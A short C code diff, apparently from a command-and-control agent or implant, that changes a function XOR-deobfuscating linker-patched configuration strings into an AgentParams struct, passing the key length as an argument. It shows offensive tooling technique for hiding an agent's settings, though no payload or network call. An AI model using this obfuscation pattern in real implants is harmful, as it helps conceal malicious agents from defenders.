@@ -91,10 +91,10 @@ char *unpack_str(char *buf, int *offset) {
  *
 */
 
-void unpack_params(char *enc_params, char *key, AgentParams *params) {
+void unpack_params(char *enc_params, char *key, int keylen, AgentParams *params) {
 	// Takes the packed strings patched in by the linker, deobfuscates them, and unpacks it into an AgentParams struct.
 	char *raw_params = KERNEL32$VirtualAlloc(0, PARAM_BUFFER_LEN, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-	xorify(raw_params, enc_params, PARAM_BUFFER_LEN, key, XORKEY_LEN);
+	xorify(raw_params, enc_params, PARAM_BUFFER_LEN, key, keylen);
 	
 	int offset = 0;
 	
